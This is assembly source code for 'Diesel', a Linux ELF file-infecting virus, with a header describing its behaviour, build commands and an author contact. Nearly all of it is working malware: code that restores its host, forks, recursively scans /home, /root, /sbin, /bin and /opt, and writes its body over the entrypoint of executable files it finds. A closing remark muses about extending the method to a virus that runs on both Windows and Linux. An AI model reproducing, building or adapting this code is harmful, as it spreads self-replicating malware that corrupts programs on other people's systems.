    ;---------------------------------------------------------------------------;
    ;                                                                           ;
    ;                               D I E S E L                                 ;
    ;                                                                           ;
    ;     Diesel is a non-resident virus targeted at  ELF executables under     ;
    ;   Linux. When executed, it will restore the host, fork, and then begin    ;
    ;   to  scan recursively  for files  to infect  in several directories.     ;
    ;     This virus is partly  based on the Staog virus by Quantum / VLAD.     ;
    ;   However, contrary to Staog, Diesel can be runned under all versions     ;
    ;   of the Linux  kernel. Note that it won't attempt to infect the /usr     ;
    ;   directory, although  it contains  many executable files  to infect.     ;
    ;     This  comes from  the fact that, if given  root access, infecting     ;
    ;   /usr will  simply  make Linux crash -  even the login. This problem     ;
    ;   will be fixed later. If you want to see how Diesel works, enter :       ;
    ;   strace diesel &> infect.log (better run it in user mode).               ;
    ;     Diesel has been fully tested under Suse Linux 6.3 as root. It does    ;
    ;   not cause any segmentation fault, and the system behaves as usual.      ;
    ;                                                                           ;
    ;  How to make the virus : TASM        DIESEL                               ;
    ;                          TLINK /3 /t DIESEL,DIESEL.                       ;
    ;                                                                           ;
    ;  Comments can be sent to paddingx@mail.dotcom.fr                          ;
    ;                                                                           ;
    ;---------------------------------------------------------------------------;

   .386

   LARGESTACK

   RADIX        16

   ASSUME       CS:CODE,DS:CODE

   CODE         SEGMENT

   @            equ           + ebx - offset VStart

   ;---------------------------------------------------------------------------;

   ELF:

                db           07F, 'ELF', 1, 1, 1, 9 dup (0)
                dw           02, 03, 01, 00
                dd           offset Virus + MemBase
                dd           offset Program_Header
                dd           00, 00
                dw           34, 20, 01
                dw           00, 00, 00

   Program_Header:

                dd           01                           ; Loadable Segment
                dd           00                           ; Physical Offset
                dd           MemBase                      ; Image Base
                dd           MemBase                      ; Same (Unused)
                dd           VSize + ELF_Size             ; Physical Size
                dd           VSize + ELF_Size             ; Memory Size
                dd           07                           ; Exec / Read / Write
                dd           1000h                        ; Alignment

   ;---------------------------------------------------------------------------;

   VStart:

   Variables     =           ebp + 14
   Argv0         =           ebp + 0C
   HostRet       =           ebp + 04
   HostName      =           ebp - 80

                push         0            ; Room for Entrypoint

                push         ebp
                mov          ebp,esp
                sub          esp,80
                pushad

                call         GetVStart
                mov          [HostRet],ebx

                mov          esi,ebx
                mov          edi,esp
                sub          edi,0800                 ; Should be enough
                mov          ecx,VSize
                repz         movsb

                sub          edi,offset VEnd - VStackCopy

                jmp          edi

   VStackCopy:

                mov          ebx,[Argv0]
                mov          ecx,00
                mov          eax,05
                int          80                        ; Try to Open Host

                or           eax,eax                   ; Search Host In PATH
                jns          short HostOpenOk          ; If Unsuccessful

   ; Env. variables arer located at the bottom of the stack, just below
   ; the kernel code (at 0xC0000000)

                mov          esi,esp

   GetPath:

                lodsd                                  ; Try to locate PATH
                sub          esi,3
                cmp          eax,'HTAP'
                jnz          short GetPath

                cmp          byte ptr [esi - 02],00
                jnz          short GetPath

                lodsd

   NextPathDir:

                lea          edi,[HostName]

   GetDir:
                cmp          byte ptr [esi],0
                jz           Bye

                movsb

                cmp          byte ptr [esi],':'
                jnz          short GetDir

                inc          esi
                mov          al,'/'
                stosb

                mov          ecx,[Argv0]         ; Don't modify esi - so use ecx

   GetHostName:

                mov          al,[ecx]
                inc          ecx
                stosb
                cmp          byte ptr [ecx - 1],0
                jnz          short GetHostName

                lea          ebx,[HostName]
                mov          ecx,00
                mov          eax,05
                int          80

                or           eax,eax
                js           short NextPathDir

   HostOpenOk:

                mov          ebx,eax                   ; Seek to Host Code
                mov          ecx,-VSize                ; From end
                mov          edx,02
                mov          eax,13
                int          80

                mov          ecx,[HostRet]             ; Restore Host Code
                mov          edx,VSize
                mov          eax,03                    ; read
                int          80

                or           eax,eax
                js           short Bye

                mov          eax,06                    ; close
                int          80

                mov          eax,02                    ; fork
                int          80

                or           eax,eax
                jz           short Virus

   ;--------------------------- <<< Host Process >>> --------------------------;

   Host:
                popad
                add          esp,80
                pop          ebp
                ret                       ; Get Back to Entrypoint

   ;--------------------------- <<< Viral Process >>> -------------------------;

   Virus:
                call         GetVStart

                add          ebx,offset Root - VStart
                mov          eax,0C
                int          80                        ; chdir to /

                add          ebx,2

   DirLoop:
                push         ebx
                call         DirSearch

                cmp          byte ptr [ebx],00
                jnz          short NextDir

   Bye:

                mov          ebx,-1
                mov          eax,01
                int          80

   NextDir:
                inc          ebx
                cmp          byte ptr [ebx - 1],00
                jz           short DirLoop
                jmp          short NextDir

   ;--------------------- <<< Directory Search Routine >>> --------------------;

   DirSearch:

   DirName       =           ebp + 08
   DirHandle     =           ebp - 04
   DirBuf        =           ebp - 8E     ; 128 bytes for file name
   StatBuf       =           ebp - 0CE    ;  64 bytes for file stats

                push         ebp
                mov          ebp,esp
                sub          esp,0CE
                push         ebx

                mov          ebx,[DirName]
                mov          ecx,00
                mov          eax,05
                int          80                        ; open DirName

                or           eax,eax
                js           DirExit

                mov          [DirHandle],eax

                mov          eax,0C                    ; chdir to DirName
                int          80

                or           eax,eax
                js           DirClose

   FindFile:

                mov          ebx,[DirHandle]
                lea          ecx,[DirBuf]
                mov          eax,59
                int          80

                or           eax,eax
                jng          DirBack

                lea          ebx,[DirBuf + 0A]

                cmp          word ptr [ebx],002E       ; . ?
                jz           short FindFile

                cmp          word ptr [ebx],2E2E       ; .. ?
                jz           short FindFile

                mov          eax,[ebx]
                and          eax,00FFFFFF
                cmp          eax,00007370
                jz           short FindFile            ; Don't infect ps

                lea          ecx,[StatBuf]
                mov          eax,6A
                int          80                        ; stat

                mov          eax,[ecx + 08]
                test         eax,4000                  ; test if directory
                jz           short ExecTest

                mov          edx,80                ; make sure it's not a link
                mov          eax,85d               ; readlink
                int          80

                or           eax,eax
                jns          short FindFile

                push         ebx
                call         DirSearch

                jmp          short FindFile

   ExecTest:

                test         eax,01                    ; others exec permission
                jnz          short SizeTest

                test         eax,08                    ; group exec permission
                jnz          short SizeTest

                test         eax,40                    ; owner exec permission
                jz           short FindFile

   SizeTest:

                mov          eax,[ecx + 14]

                cmp          eax,1000
                jc           FindFile            ; Minimal File Size

                and          eax,111111b
                cmp          eax,010101b
                jz           FindFile            ; Self-Infection Test

                push         dword ptr [ecx + 14]
                push         ebx
                call         Infect

                jmp          FindFile

   DirBack:

                lea          ebx,[ebp - 8]
                mov          dword ptr [ebx],00002E2E  ; cd ..
                mov          eax,0C
                int          80

   DirClose:

                mov          ebx,[DirHandle]
                mov          eax,06
                int          80

   DirExit:
                pop          ebx
                add          esp,0CE
                pop          ebp
                ret          04

   ;------------------------ <<< Infection Routine >>> ------------------------;

   Infect:

   FileSize      =           ebp +  0C
   FileName      =           ebp +  08
   FileHandle    =           ebp -  04
   FileBuf       =           ebp - 404    ; 1024 bytes for Read/Write Buffer
                                          ; ! Must be <= VSize
                push         ebp
                mov          ebp,esp
                sub          esp,404

                mov          ebx,[FileName]
                mov          ecx,02
                mov          eax,05
                int          80                        ; Open file

                or           eax,eax
                js           InfExit

                mov          [FileHandle],eax

                mov          ebx,eax
                lea          ecx,[FileBuf]
                mov          edx,100                   ; Read File Header
                mov          eax,03
                int          80

                or           eax,eax
                js           InfClose

                mov          edi,ecx

                cmp          dword ptr [edi],464C457F  ; Check if ELF
                jnz          InfClose

                cmp          dword ptr [edi + 10],00030002  ; Executable i386
                jnz          InfClose

                mov          esi,[edi + 1C]
                cmp          esi,34                    ; Offset to Program Header
                jnz          InfClose
                add          esi,ecx

                xor          ecx,ecx
                mov          cx,[edi + 2C]             ; Number of Entries

                mov          edi,[edi + 18]            ; Entrypoint

   FindCodeSection:

                cmp          byte ptr [esi],01         ; Loadable Segment ?
                jnz          short NextOne

                cmp          dword ptr [esi + 4],0     ; Offset = File Start ?
                jnz          short NextOne

                cmp          byte ptr [esi + 18],05    ; Exec / Read ?
                jnz          short NextOne

                cmp          dword ptr [esi + 1C],1000 ; Aligned on 1000h ?
                jz           short Found

   NextOne:

                add          esi,20
                loop         FindCodeSection

                jmp          InfClose

   Found:

                mov          eax,[esi + 10]            ; Section Physical Size
                sub          eax,edi                   ; - (Entrypoint
                add          eax,[esi + 08]            ;  - Virtual Address)
                                                       ; = Room Available
                cmp          eax,VSize
                jc           InfClose

                sub          edi,[esi + 08]            ; Store EP Offset in EDI

                mov          byte ptr [esi + 18],07    ; Make Code Section
                                                       ; Writeable
                xor          ecx,ecx
                xor          edx,edx
                mov          eax,13
                int          80

                lea          ecx,[FileBuf]
                mov          edx,100
                mov          eax,04
                int          80                        ; Write Header

                mov          ecx,edi
                mov          edx,00
                mov          eax,13
                int          80                     ; Seek to Entrypoint Offset

                lea          ecx,[FileBuf]
                mov          edx,VSize
                mov          eax,03
                int          80                        ; Read Host Code

                mov          ecx,edi
                mov          edx,00
                mov          eax,13
                int          80                     ; Seek to Entrypoint Offset

                call         Epsilon
   Epsilon:     pop          ecx
                sub          ecx,offset Epsilon - VStart

                mov          edx,VSize
                mov          eax,04
                int          80                        ; Write Virus

                mov          ecx,VSize
                add          ecx,[FileSize]
                neg          ecx
                add          ecx,010101b
                and          ecx,111111b
                add          ecx,[FileSize]
                xor          edx,edx
                mov          eax,13                    ; Seek to End of File
                int          80                        ; + Self-Infection Test

                lea          ecx,[FileBuf]
                mov          edx,VSize
                mov          eax,04
                int          80                        ; Write Host Code

   InfClose:

                mov          ebx,[FileHandle]
                mov          eax,06
                int          80

   InfExit:

                add          esp,404
                pop          ebp
                ret          08

   ;-------------------- <<< Dynamic Relocation Routine >>> -------------------;

   GetVStart:

                call         Gamma
   Gamma:       pop          ebx
                sub          ebx,offset Gamma - VStart
                ret

   ;------------------------- <<< Initialized Data >>> ------------------------;

   Root         db           '/',0

   Dirs:
                db           'home',0
                db           'root',0
                db           'sbin',0
                db           'bin',0
                db           'opt',0
                db           0

   Sign         db           0A,0A,'  [ Diesel : Oil, Heavy Petroleum Fraction '
                db           'Used In Diesel Engines ]  ',0A,0A,0

   VEnd:

   ;---------------------------------------------------------------------------;

   ELF_Size     equ          54
   VSize        equ          offset VEnd - VStart
   MemBase      equ          08048000

   ;---------------------------------------------------------------------------;

   CODE         ENDS

   END          ELF

    ;--------------------------------- < P.S.> ---------------------------------;
    ;                                                                           ;
    ;  You see, int 80 is a VERY powerful tool under Linux. In fact, any        ;
    ;  32-bit  process is able to use it - even Win32 programs which run        ;
    ;  under Wine. So it wouldn't be too much difficult to write a cross-       ;
    ;  platform virus, which would run under both Windows and Linux.            ;
    ;                                                                           ;
    ;---------------------------------------------------------------------------;
